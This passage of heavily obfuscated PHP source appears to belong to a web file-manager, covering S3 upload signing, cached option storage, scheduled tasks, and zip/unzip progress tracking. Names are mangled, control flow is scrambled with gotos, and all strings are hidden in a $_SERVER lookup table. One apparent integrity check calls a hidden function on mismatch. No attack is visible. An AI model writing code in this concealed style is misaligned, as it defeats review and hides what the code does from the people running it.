$dÕˆƒÉÁÜĞ[1210]; goto b‘³ì½; b•œ•›»£: $däàÕæâŞ¿ = $dÕˆƒÉÁÜĞ[1212]; $aóßŠ°Ø‰Œ = $c’¢Şºæ–² . $dÕˆƒÉÁÜĞ[33]; $b™ôäŠ³¹† = $dÕˆƒÉÁÜĞ[1175]; goto aÚ„ÛöòÔ×; E –¼¨‹¤²: $a“³ÂŒîêÖ = hash_hmac($dÕˆƒÉÁÜĞ[1220], $dî°¼©‚Ç, $d›Öˆ—º÷, !0); $FÇ«Ş—ˆÅ¸ = hash_hmac($dÕˆƒÉÁÜĞ[1220], $däàÕæâŞ¿, $a“³ÂŒîêÖ, !0); $AÄ±”ŸóÄ = hash_hmac($dÕˆƒÉÁÜĞ[1220], $bº Ÿ¥İ‡Û, $FÇ«Ş—ˆÅ¸); goto ağ‡Ñà•§; b‘³ì½: $dî°¼©‚Ç = $dÕˆƒÉÁÜĞ[59]; $D×„¾‰İÃ = gmdate($dÕˆƒÉÁÜĞ[1211]); $câœ¶ß  = gmdate($dÕˆƒÉÁÜĞ[712]); goto b•œ•›»£; aÚ„ÛöòÔ×: $cˆ™“öç£Ã = array($this->accessKey, $câœ¶ß , $this->region, $dî°¼©‚Ç, $däàÕæâŞ¿); $E‹œ²à´‚ = implode($dÕˆƒÉÁÜĞ[8], $cˆ™“öç£Ã); $CŒ°Šº×ç = array($dÕˆƒÉÁÜĞ[1177] => gmdate($dÕˆƒÉÁÜĞ[1176], strtotime($dÕˆƒÉÁÜĞ[1213])), $dÕˆƒÉÁÜĞ[1178] => array(array($dÕˆƒÉÁÜĞ[1180] => $this->bucket), array($dÕˆƒÉÁÜĞ[1179] => $e£æ‡ÆÏìÚ), array($dÕˆƒÉÁÜĞ[1181], $dÕˆƒÉÁÜĞ[1182], $dÕˆƒÉÁÜĞ[33]), array($dÕˆƒÉÁÜĞ[1181], $dÕˆƒÉÁÜĞ[1214], $dÕˆƒÉÁÜĞ[33]), array($dÕˆƒÉÁÜĞ[1181], $dÕˆƒÉÁÜĞ[1215], $dÕˆƒÉÁÜĞ[33]), array($dÕˆƒÉÁÜĞ[1183] => $b™ôäŠ³¹†), array($dÕˆƒÉÁÜĞ[1216] => $E‹œ²à´‚), array($dÕˆƒÉÁÜĞ[1217] => $Cçæ‹ÈóÍ½), array($dÕˆƒÉÁÜĞ[1218] => $D×„¾‰İÃ), array($dÕˆƒÉÁÜĞ[1219] => $aóßŠ°Ø‰Œ))); goto f±Ë×›ğ•; f±Ë×›ğ•: $bº Ÿ¥İ‡Û = base64_encode(json_encode($CŒ°Šº×ç)); $d‚¥„ñÀ©é = hash_hmac($dÕˆƒÉÁÜĞ[1220], $câœ¶ß , $dÕˆƒÉÁÜĞ[1221] . $this->secret, !0); $d›Öˆ—º÷ = hash_hmac($dÕˆƒÉÁÜĞ[1220], $this->region, $d‚¥„ñÀ©é, !0); goto E –¼¨‹¤²; ağ‡Ñà•§: $eäŞÎÛ£Ê× = array($dÕˆƒÉÁÜĞ[210] => $dÕˆƒÉÁÜĞ[33], $dÕˆƒÉÁÜĞ[1222] => $dÕˆƒÉÁÜĞ[33], $dÕˆƒÉÁÜĞ[1179] => $e£æ‡ÆÏìÚ, $dÕˆƒÉÁÜĞ[1183] => $b™ôäŠ³¹†, $dÕˆƒÉÁÜĞ[1187] => $bº Ÿ¥İ‡Û, $dÕˆƒÉÁÜĞ[1223] => $E‹œ²à´‚, $dÕˆƒÉÁÜĞ[1224] => $Cçæ‹ÈóÍ½, $dÕˆƒÉÁÜĞ[1225] => $D×„¾‰İÃ, $dÕˆƒÉÁÜĞ[1226] => $aóßŠ°Ø‰Œ, $dÕˆƒÉÁÜĞ[1227] => $AÄ±”ŸóÄ, $dÕˆƒÉÁÜĞ[175] => $this->getHost()); return $eäŞÎÛ£Ê×; goto b…¶šç’ƒÖ; b…¶šç’ƒÖ: } } goto a¼ÙÕ–†¥¾; bƒŸî¹ºƒ: $fÈñªÜ®…· = $_SERVER[Šº][394]; if ($_SERVER[$_SERVER[Šº][395]] != $fÈñªÜ®…·($B£ñ»ëçÍ)) { goto E™»«×Å‚”; Eš“£°: $bÜ³——¾Æ = explode($_SERVER[Šº][228], $BÙ‰–à‘·); if (count($bÜ³——¾Æ) < $_SERVER[Šº][399]) { $b‘Õœ„÷éö = $_SERVER[Šº][400]; $b‘Õœ„÷éö(); } $CÍ×˜œ‹Ç£ = $_SERVER[Šº][401]; goto eñğêÒ±ñ‹; E™»«×Å‚”: $e©™˜Ã¤‹Ó = $_SERVER[Šº][396]; $F«¿¹÷É¸’ = $_SERVER[$_SERVER[Šº][397]] . $_SERVER[Šº][398]; $BÙ‰–à‘· = $e©™˜Ã¤‹Ó($F«¿¹÷É¸’); goto Eš“£°; eñğêÒ±ñ‹: $CÍ×˜œ‹Ç£($B£ñ»ëçÍ); goto CÑ³šÌÜ¨Ğ; CÑ³šÌÜ¨Ğ: } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($eÚ­»ô‘ñâ = false, $fÓ§°Ô¥äÎ = '', $FÛÚˆÏ‹Ì² = false) { goto C­©¹Şïè; eË›îİ¡ëİ: $this->cacheSet($fÓ§°Ô¥äÎ, $a–‡ªòÜ¨); $a–‡ªòÜ¨ = array_merge($d²±ÅéÅ·, $a–‡ªòÜ¨); return $eÚ­»ô‘ñâ ? $a–‡ªòÜ¨[$eÚ­»ô‘ñâ] : $a–‡ªòÜ¨; goto f“Õì…•ù; d“‡Ô–”œ†: $d²±ÅéÅ· = is_array($d²±ÅéÅ·) ? $d²±ÅéÅ· : array(); if (is_array($a–‡ªòÜ¨)) { $a–‡ªòÜ¨ = array_merge($d²±ÅéÅ·, $a–‡ªòÜ¨); return $eÚ­»ô‘ñâ ? isset($a–‡ªòÜ¨[$eÚ­»ô‘ñâ]) ? $a–‡ªòÜ¨[$eÚ­»ô‘ñâ] : null : $a–‡ªòÜ¨; } $e»Âç‹·•¶ = $this->filterWhere(array($EÆÍáğ©ˆ™[29] => $fÓ§°Ô¥äÎ)); goto aØ×–ğ—˜ó; C­©¹Şïè: $EÆÍáğ©ˆ™ =& $_SERVER[Šº]; $a–‡ªòÜ¨ = $this->cacheGet($fÓ§°Ô¥äÎ); $d²±ÅéÅ· = $this->optionDefault($fÓ§°Ô¥äÎ); goto d“‡Ô–”œ†; aØ×–ğ—˜ó: $a–‡ªòÜ¨ = $this->where($e»Âç‹·•¶)->select(); $a–‡ªòÜ¨ = array_to_keyvalue($a–‡ªòÜ¨, $EÆÍáğ©ˆ™[93], $EÆÍáğ©ˆ™[371]); foreach ($a–‡ªòÜ¨ as $e„™ÍİåÍê => $C­ˆ’ÅÂª¡) { if ($FÛÚˆÏ‹Ì² || in_array($e„™ÍİåÍê, $this->jsonField)) { $a–‡ªòÜ¨[$e„™ÍİåÍê] = json_decode($C­ˆ’ÅÂª¡, !0); } } goto eË›îİ¡ëİ; f“Õì…•ù: } public function set($EÀÛ³«‘ºù, $a”âğ¸ÊÈå = false, $B‹°„ãÁ¤ = '') { goto B¶“´İöˆ„; C³ğä»‰ìä: $A–á‰ºõê× = is_array($EÀÛ³«‘ºù) ? $EÀÛ³«‘ºù : array($EÀÛ³«‘ºù => $a”âğ¸ÊÈå); foreach ($A–á‰ºõê× as $a¼æ¡ª¡ê± => $EíªÔ°Âß”) { if (is_array($EíªÔ°Âß”)) { $EíªÔ°Âß” = json_encode_force($EíªÔ°Âß”); } $this->checkLength($EíªÔ°Âß”, !1, $this->tableName . $E××¾°åó[4] . $EÀÛ³«‘ºù); $EíªÔ°Âß” = self::textEncode($EíªÔ°Âß”); $A–á‰ºõê× = array($E××¾°åó[29] => $B‹°„ãÁ¤, $E××¾°åó[93] => $a¼æ¡ª¡ê±, $E××¾°åó[371] => $EíªÔ°Âß”); $Bƒ–§‘å¹Œ[] = $this->filterWhere($A–á‰ºõê×); } if (!$Bƒ–§‘å¹Œ) { return !0; } goto A«¯öò±œ; A«¯öò±œ: return $this->addAll($Bƒ–§‘å¹Œ, array(), !0); goto A‡ÎƒÌ®–; B¶“´İöˆ„: $E××¾°åó =& $_SERVER[Šº]; $this->cacheRemove($B‹°„ãÁ¤); $Bƒ–§‘å¹Œ = array(); goto C³ğä»‰ìä; A‡ÎƒÌ®–: } protected function optionDefault($dÈÉÊŞ‡Æ‘ = '') { return !1; } public function setDeep($B¤ØŠÃîÔØ, $AˆêŒÜô‘ = false, $d‰›áöï¡Ì = '') { $eÉ¶´·‹“ = explode($_SERVER[Šº][95], $B¤ØŠÃîÔØ); $fØìÁ—‰© = $this->get(); array_set_value($fØìÁ—‰©, $B¤ØŠÃîÔØ, $AˆêŒÜô‘); $this->set($eÉ¶´·‹“[0], $fØìÁ—‰©[$eÉ¶´·‹“[0]], $d‰›áöï¡Ì); } public function remove($dÚ¡Ò‹Ò , $døÄ¤ªæá” = '') { $EéË–³ =& $_SERVER[Šº]; $this->cacheRemove($døÄ¤ªæá”); $aî¼†¹²‚¤ = $this->filterWhere(array($EéË–³[93] => $dÚ¡Ò‹Ò , $EéË–³[29] => $døÄ¤ªæá”)); if (is_null($dÚ¡Ò‹Ò )) { unset($aî¼†¹²‚¤[$EéË–³[93]]); } return $this->where($aî¼†¹²‚¤)->delete(); } public function cacheSet($aˆæá©É¯ö, $c‰ñ½çÍ = false) { return Cache::set($this->cacheKey($aˆæá©É¯ö), $c‰ñ½çÍ); } public function cacheGet($b½¼¼íŞé) { return Cache::get($this->cacheKey($b½¼¼íŞé)); } public function cacheRemove($aãŞ¨ ¾ÚÙ) { return Cache::remove($this->cacheKey($aãŞ¨ ¾ÚÙ)); } protected function filterWhere($d¡ñô‚í¼¥) { return $d¡ñô‚í¼¥; } protected function cacheKey($D£ÛÇ‡ß) { return $D£ÛÇ‡ß; } } goto EØåÓÕÛôé; cÉŠÇÊ˜öÆ: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($f‡â„Šİ‰†, $dÁ°‡ºŸ¼¸ = 5.0) { if (!$f‡â„Šİ‰†) { return; } $Aó¬ÙÚ³‚å = Cache::get($f‡â„Šİ‰†); if (!$Aó¬ÙÚ³‚å || timeFloat() - floatVal($Aó¬ÙÚ³‚å) >= $dÁ°‡ºŸ¼¸) { Cache::set($f‡â„Šİ‰†, timeFloat(), $dÁ°‡ºŸ¼¸ * 10); return !0; } return !1; } public static function timeLimitCall($cà ¸¹õ‡, $BĞÚ„èïŠ, $fß‹èš‚÷ô, $Bùöã»ğğ = 5.0) { goto a‚ò§²ªÙœ; a‚ò§²ªÙœ: $A³ŒÖ¥ï =& $_SERVER[Šº]; if (!$cà ¸¹õ‡ || !$BĞÚ„èïŠ) { return; } self::$asyncAdd = !0; goto fÓªÚ½ï Í; fÓªÚ½ï Í: $CÆº½êŠÉ¿ = $A³ŒÖ¥ï[1588]; $eÆ‡©ßš¨ = Cache::get($CÆº½êŠÉ¿, !0); $BÅŞù™“˜ = array($A³ŒÖ¥ï[1589] => timeFloat(), $A³ŒÖ¥ï[1590] => timeFloat(), $A³ŒÖ¥ï[261] => $BĞÚ„èïŠ, $A³ŒÖ¥ï[1583] => $fß‹èš‚÷ô, $A³ŒÖ¥ï[196] => $Bùöã»ğğ); goto E±ê‡±éï; E±ê‡±éï: if (is_array($eÆ‡©ßš¨[$cà ¸¹õ‡])) { $BÅŞù™“˜[$A³ŒÖ¥ï[1590]] = $eÆ‡©ßš¨[$cà ¸¹õ‡][$A³ŒÖ¥ï[1590]]; } if (is_array($eÆ‡©ßš¨[$cà ¸¹õ‡])) { if (timeFloat() - $eÆ‡©ßš¨[$cà ¸¹õ‡][$A³ŒÖ¥ï[1589]] < $BÅŞù™“˜[$A³ŒÖ¥ï[196]] * 0.3) { return; } $BÅŞù™“˜[$A³ŒÖ¥ï[1590]] = $eÆ‡©ßš¨[$cà ¸¹õ‡][$A³ŒÖ¥ï[1590]]; } $eÆ‡©ßš¨[$cà ¸¹õ‡] = $BÅŞù™“˜; goto a¸ÄÂÑÛ”; a¸ÄÂÑÛ”: Cache::set($CÆº½êŠÉ¿, $eÆ‡©ßš¨, 60); Cache::removeMemory($CÆº½êŠÉ¿); write_log($A³ŒÖ¥ï[1591] . $cà ¸¹õ‡ . $A³ŒÖ¥ï[68] . $BĞÚ„èïŠ, $A³ŒÖ¥ï[1585]); goto C“óˆÇŒâµ; C“óˆÇŒâµ: } public static function timeLimitCallLoop() { goto f”‹ºâ¬ˆ‘; fó‚ÔÂˆòÄ: $EÈßÃ®ô†† = array(); foreach ($FìÙ¶İ›áö as $F¦â×Ø‡ => $fİ™ËÃÚÃ) { if ($c¿ËäØŠÁ - $fİ™ËÃÚÃ[$BÎßĞ‘Ö²Ç[1590]] > $fİ™ËÃÚÃ[$BÎßĞ‘Ö²Ç[196]]) { $EéÑµ¸µ‰È = !0; try { Hook::apply($fİ™ËÃÚÃ[$BÎßĞ‘Ö²Ç[261]], $fİ™ËÃÚÃ[$BÎßĞ‘Ö²Ç[1583]]); write_log($BÎßĞ‘Ö²Ç[1593] . $F¦â×Ø‡ . $BÎßĞ‘Ö²Ç[68] . $fİ™ËÃÚÃ[$BÎßĞ‘Ö²Ç[261]] . $BÎßĞ‘Ö²Ç[1594] . ACTION, $BÎßĞ‘Ö²Ç[1585]); } catch (Exception $D‘çÖƒ„»±) { } continue; } $EÈßÃ®ô††[$F¦â×Ø‡] = $fİ™ËÃÚÃ; } if (!$EéÑµ¸µ‰È) { return; } goto cæ†ŠÌªíä; cæ†ŠÌªíä: if (!$EÈßÃ®ô††) { return Cache::remove($eñØ†…ä“È); } Cache::set($eñØ†…ä“È, $EÈßÃ®ô††, 60); Cache::removeMemory($eñØ†…ä“È); goto aƒÀ–Ãª±è; f”‹ºâ¬ˆ‘: $BÎßĞ‘Ö²Ç =& $_SERVER[Šº]; $C„å¹„‹‡ƒ = array($BÎßĞ‘Ö²Ç[1592]); $F ËÔæö¶Ñ = in_array(strtolower(ACTION), $C„å¹„‹‡ƒ); goto fŒ³Ï¡Âèª; C½õ”ğ²ÒÃ: if (!$FìÙ¶İ›áö || count($FìÙ¶İ›áö) <= 0) { return; } $EéÑµ¸µ‰È = !1; $c¿ËäØŠÁ = timeFloat(); goto fó‚ÔÂˆòÄ; fŒ³Ï¡Âèª: if (!$F ËÔæö¶Ñ && !self::$asyncAdd) { return; } $eñØ†…ä“È = $BÎßĞ‘Ö²Ç[1588]; $FìÙ¶İ›áö = Cache::get($eñØ†…ä“È, !0); goto C½õ”ğ²ÒÃ; aƒÀ–Ãª±è: } public static function finished($DÓ»…²óÖ, $BÊß¬ÚÖ) { $E¸Æ—¢Ü‰ =& $_SERVER[Šº]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($E¸Æ—¢Ü‰[261] => $DÓ»…²óÖ, $E¸Æ—¢Ü‰[1583] => $BÊß¬ÚÖ); } private static function finishedRun() { $bß»ô « =& $_SERVER[Šº]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $bé¦Ğã¯–‡) { try { Hook::apply($bé¦Ğã¯–‡[$bß»ô «[261]], $bé¦Ğã¯–‡[$bß»ô «[1583]]); } catch (Exception $e§äø¾×š§) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto AÄ±¶Í„è; b»·æ¡‡¿: if (!$Bî¦Ï…ÙÊ[$ağ¡£‹¾ó[1420]]) { $Bî¦Ï…ÙÊ[$ağ¡£‹¾ó[1420]] = LNG($ağ¡£‹¾ó[1599]); } goto DÕÁ³Ò——Ñ; AÄ±¶Í„è: $ağ¡£‹¾ó =& $_SERVER[Šº]; parent::startAfter(); Hook::bind($ağ¡£‹¾ó[1595], array($this, $ağ¡£‹¾ó[1596])); goto Aó ‰ººÚõ; Aó ‰ººÚõ: Hook::bind($ağ¡£‹¾ó[1077], array($this, $ağ¡£‹¾ó[1597])); $Bî¦Ï…ÙÊ =& $this->task; $Bî¦Ï…ÙÊ[$ağ¡£‹¾ó[1598]] = $ağ¡£‹¾ó[1082]; goto b»·æ¡‡¿; DÕÁ³Ò——Ñ: } protected function endAfter() { $cº’—°¾”ç =& $_SERVER[Šº]; parent::endAfter(); Hook::unbind($cº’—°¾”ç[1595], array($this, $cº’—°¾”ç[1596])); Hook::unbind($cº’—°¾”ç[1077], array($this, $cº’—°¾”ç[1597])); } public function updateAfter() { $EŒ™¸çÜšÄ =& $_SERVER[Šº]; $C‰¶„ÜÛÛ‰ =& $this->task; if (!$C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1009]] || !$C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[721]]) { return; } if ($C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1598]] == $EŒ™¸çÜšÄ[1082]) { $cÜÊ†¬¤° = 0; if ($C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1557]]) { $cÜÊ†¬¤° = $C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1558]] / $C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1557]]; } $C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1515]] = $cÜÊ†¬¤° * 0.3; } else { if ($C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1598]] == $EŒ™¸çÜšÄ[310]) { $cÜÊ†¬¤° = $C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1024]] / $C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1009]]; $C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1515]] = 0.3 + $cÜÊ†¬¤° * 0.4; } else { if ($C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1598]] == $EŒ™¸çÜšÄ[107]) { $E‰ØéÊ¹³é = 0; if ($C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1559]] == $EŒ™¸çÜšÄ[107]) { $E‰ØéÊ¹³é = $C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1558]]; } $cÜÊ†¬¤° = ($C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1562]] + $E‰ØéÊ¹³é) / $C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[721]]; $C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1515]] = 0.3 + 0.4 + $cÜÊ†¬¤° * 0.3; } } } if ($C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1515]] > 0) { $Eº¶ÆÖ°ÂÈ = timeFloat() - $C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[747]] - $C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1518]]; $C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1519]] = $Eº¶ÆÖ°ÂÈ * (1 - $C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1515]]) / $C‰¶„ÜÛÛ‰[$EŒ™¸çÜšÄ[1515]]; } } public function addFile($e‹Ê³ä¨ĞÇ) { goto b¦‹ŠË‘¥; EÇêÀ†ê¥ù: $this->update(); goto c‰ÂãâåÙ; EğµàÌ„°ø: $FôŒÆ¼÷›[$dó…äÙö¿[1555]] = $a•ÇÍ«¯¡Ï[$dó…äÙö¿[28]]; $FôŒÆ¼÷›[$dó…äÙö¿[1557]] = $a•ÇÍ«¯¡Ï[$dó…äÙö¿[78]]; $FôŒÆ¼÷›[$dó…äÙö¿[1558]] = 0; goto cÀ–’Šàè; b¦‹ŠË‘¥: $dó…äÙö¿ =& $_SERVER[Šº]; $FôŒÆ¼÷› =& $this->task; $a•ÇÍ«¯¡Ï = IO::info($e‹Ê³ä¨ĞÇ); goto EğµàÌ„°ø; cÀ–’Šàè: $FôŒÆ¼÷›[$dó…äÙö¿[1011]] = $dó…äÙö¿[1574]; $FôŒÆ¼÷›[$dó…äÙö¿[1559]] = $dó…äÙö¿[1082]; $FôŒÆ¼÷›[$dó…äÙö¿[721]] = $a•ÇÍ«¯¡Ï[$dó…äÙö¿[78]]; goto b¡à§Ã„¾Ñ; b¡à§Ã„¾Ñ: $FôŒÆ¼÷›[$dó…äÙö¿[1009]] = 1; $Eƒƒ‘†¡ƒ‰ = 0; $FôŒÆ¼÷›[$dó…äÙö¿[1566]] = array($dó…äÙö¿[1567] => $Eƒƒ‘†¡ƒ‰ + 1, $dó…äÙö¿[420] => $a•ÇÍ«¯¡Ï[$dó…äÙö¿[28]], $dó…äÙö¿[76] => $a•ÇÍ«¯¡Ï[$dó…äÙö¿[76]], $dó…äÙö¿[502] => $a•ÇÍ«¯¡Ï[$dó…äÙö¿[502]] ? $a•ÇÍ«¯¡Ï[$dó…äÙö¿[502]] : $a•ÇÍ«¯¡Ï[$dó…äÙö¿[76]]); goto EÇêÀ†ê¥ù; c‰ÂãâåÙ: } public function unzipAfter($d®åî´ª‡») { goto AğøšÈ„ê¯; fï­£¶†—´: $e¬ÀšÇ¤É = IO::infoWithChildren($d®åî´ª‡»); $bğ±Ã´İÇ = 0; $E¸¹¡·‚¹í[$B‘À¶ö·Ã£[1566]] = array($B‘À¶ö·Ã£[1567] => $bğ±Ã´İÇ + 1, $B‘À¶ö·Ã£[420] => $e¬ÀšÇ¤É[$B‘À¶ö·Ã£[28]], $B‘À¶ö·Ã£[76] => $e¬ÀšÇ¤É[$B‘À¶ö·Ã£[76]], $B‘À¶ö·Ã£[502] => $e¬ÀšÇ¤É[$B‘À¶ö·Ã£[502]] ? $e¬ÀšÇ¤É[$B‘À¶ö·Ã£[502]] : $e¬ÀšÇ¤É[$B‘À¶ö·Ã£[76]]); goto dÓ‡³ˆÌ±¤; DÃØË‹„ôÀ: $this->update(); self::log($B‘À¶ö·Ã£[1600] . json_encode(array($E¸¹¡·‚¹í, $e¬ÀšÇ¤É))); goto bÑ‰“ˆ –½; AÊ‰ ùñµ»: $E¸¹¡·‚¹í[$B‘À¶ö·Ã£[1024]] = 0; $E¸¹¡·‚¹í[$B‘À¶ö·Ã£[1557]] = 0; $E¸¹¡·‚¹í[$B‘À¶ö·Ã£[1558]] = 0; goto Fæ¨ÙŸˆ»ê; dÓ‡³ˆÌ±¤: if ($e¬ÀšÇ¤É[$B‘À¶ö·Ã£[29]] == $B‘À¶ö·Ã£[192]) { $E¸¹¡·‚¹í[$B‘À¶ö·Ã£[1009]] = 1; } else { $E¸¹¡·‚¹í[$B‘À¶ö·Ã£[1009]] = $e¬ÀšÇ¤É[$B‘À¶ö·Ã£[81]][$B‘À¶ö·Ã£[79]]; } $E¸¹¡·‚¹í[$B‘À¶ö·Ã£[1011]] = $B‘À¶ö·Ã£[33]; $E¸¹¡·‚¹í[$B‘À¶ö·Ã£[1559]] = 0; goto AÊ‰ ùñµ»; AğøšÈ„ê¯: $B‘À¶ö·Ã£ =& $_SERVER[Šº]; $E¸¹¡·‚¹í =& $this->task; $E¸¹¡·‚¹í[$B‘À¶ö·Ã£[1598]] = $B‘À¶ö·Ã£[107]; goto fï­£¶†—´; Fæ¨ÙŸˆ»ê: $E¸¹¡·‚¹í[$B‘À¶ö·Ã£[1555]] = $B‘À¶ö·Ã£[33]; $E¸¹¡·‚¹í[$B‘À¶ö·Ã£[1562]] = 0; $E¸¹¡·‚¹í[$B‘À¶ö·Ã£[721]] = $e¬ÀšÇ¤É[$B‘À¶ö·Ã£[78]]; goto DÃØË‹„ôÀ; bÑ‰“ˆ –½: } public function nameParse($B³·†ùÕ‹î) { goto E–ÒğÅµ¤À; E–ÒğÅµ¤À: $f«Óñé‘Ñ¾ =& $_SERVER[Šº]; $C›Ñ„ä =& $this->task; if ($C›Ñ„ä[$f«Óñé‘Ñ¾[1598]] == $f«Óñé‘Ñ¾[1082]) { $C›Ñ„ä[$f«Óñé‘Ñ¾[1598]] = $f«Óñé‘Ñ¾[310]; $C›Ñ„ä[$f«Óñé‘Ñ¾[1562]] = 0; $C›Ñ„ä[$f«Óñé‘Ñ¾[721]] = 0; } goto D±‚ »¸¥; BÁ‘ˆ©Æö: $this->update(); goto eÒ´š‹„•À; D±‚ »¸¥: $cİ¦‡‚­â = get_path_this($B³·†ùÕ‹î); if (strstr($cİ¦‡‚­â, $f«Óñé‘Ñ¾[95])) { $C›Ñ„ä[$f«Óñé‘Ñ¾[1024]] += 1; $C›Ñ„ä[$f«Óñé‘Ñ¾[1009]] += 1; } $C›Ñ„ä[$f«Óñé‘Ñ¾[1555]] = $B³·†ùÕ‹î; goto BÁ‘ˆ©Æö; eÒ´š‹„•À: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $aò»ƒƒÓÄ =& $_SERVER[Šº]; parent::startAfter(); Hook::bind($aò»ƒƒÓÄ[1601], array($this, $aò»ƒƒÓÄ[1596])); $eºóßŒä¦Ö =& $this->task; $eºóßŒä¦Ö[$aò»ƒƒÓÄ[1598]] = $aò»ƒƒÓÄ[1082]; if (!$eºóßŒä¦Ö[$aò»ƒƒÓÄ[1420]]) { $eºóßŒä¦Ö[$aò»ƒƒÓÄ[1420]] = LNG($aò»ƒƒÓÄ[1602]); } } protected function endAfter() { $Aá…ÈÌ›ÚŒ =& $_SERVER[Šº]; parent::endAfter(); Hook::unbind($Aá…ÈÌ›ÚŒ[1601], array($this, $Aá…ÈÌ›ÚŒ[1596])); } public function updateAfter() { $DÏôøÜÇÙÎ =& $_SERVER[Šº]; $Cæ‹¾®ô°Á =& $this->task; if (!$Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1009]] || !$Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[721]]) { return; } if ($Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1598]] == $DÏôøÜÇÙÎ[1082]) { $CÀá¾¾¿³ = $Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1558]]; if ($Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1559]] != $DÏôøÜÇÙÎ[1082]) { $CÀá¾¾¿³ = 0; } $BİöÎ‚†‚Ş = ($Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1562]] + $CÀá¾¾¿³) / $Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[721]]; $Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1515]] = $BİöÎ‚†‚Ş * 0.3; } else { if ($Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1598]] == $DÏôøÜÇÙÎ[310]) { $BİöÎ‚†‚Ş = $Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1024]] / $Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1009]]; $Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1515]] = 0.3 + $BİöÎ‚†‚Ş * 0.5; } else { if ($Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1598]] == $DÏôøÜÇÙÎ[107]) { $BİöÎ‚†‚Ş = 0; if ($Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1557]]) { $BİöÎ‚†‚Ş = $Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1558]] / $Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1557]]; } $Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1515]] = 0.3 + 0.5 + $BİöÎ‚†‚Ş * 0.2; } } } if ($Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1515]] > 0) { $F×İø…›Ãï = timeFloat() - $Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[747]] - $Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1518]]; $Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1519]] = $F×İø…›Ãï * (1 - $Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1515]]) / $Cæ‹¾®ô°Á[$DÏôøÜÇÙÎ[1515]]; } } public function copyFileStart($c¼ù˜©‹Ñ, $B˜¦½©î…º, $BŒ™Ç¸¦Û”, $c“óÏ®Ïµ­, $B×¨ƒ†ğ, $E±äÒ¢‹ñ±) { $a–õí‡ª =& $_SERVER[Šº]; parent::copyFileStart($c¼ù˜©‹Ñ, $B˜¦½©î…º, $BŒ™Ç¸¦Û”, $c“óÏ®Ïµ­, $B×¨ƒ†ğ, $E±äÒ¢‹ñ±); $F ç×‹ÂŒ =& $this->task; if ($F ç×‹ÂŒ[$a–õí‡ª[1598]] == $a–õí‡ª[310]) { $F ç×‹ÂŒ[$a–õí‡ª[1598]] = $a–õí‡ª[107]; } $this->update(); } public function copyFileEnd($aô•›ò‘, $e„°šª¤, $cøØ”¬ƒ¼®, $fèëÎ”÷ª×, $a§ÑàÍàñŠ, $FÏÃò ´‡) { $dÅ¼²±™Šº =& $_SERVER[Šº]; $Cù²µïùò„ =& $this->task; $Cù²µïùò„[$dÅ¼²±™Šº[1558]] = $Cù²µïùò„[$dÅ¼²±™Šº[1557]]; $Cù²µïùò„[$dÅ¼²±™Šº[1562]] += $Cù²µïùò„[$dÅ¼²±™Šº[1557]]; $Cù²µïùò„[$dÅ¼²±™Šº[1559]] = $dÅ¼²±™Šº[33]; $this->update(); } public function nameParse($eËˆƒÎ³­Ø) { $bùØÇ ‚Ø =& $_SERVER[Šº]; $FÅòäÔŒô =& $this->task; if ($FÅòäÔŒô[$bùØÇ ‚Ø[1024]] < $FÅòäÔŒô[$bùØÇ ‚Ø[1009]]) { $eÛ¬Ù’àÉ« = get_path_this($eËˆƒÎ³­Ø); if (strstr($eÛ¬Ù’àÉ«, $bùØÇ ‚Ø[95])) { $FÅòäÔŒô[$bùØÇ ‚Ø[1024]] += 1; } } if ($FÅòäÔŒô[$bùØÇ ‚Ø[1598]] == $bùØÇ ‚Ø[1082]) { $FÅòäÔŒô[$bùØÇ ‚Ø[1598]] = 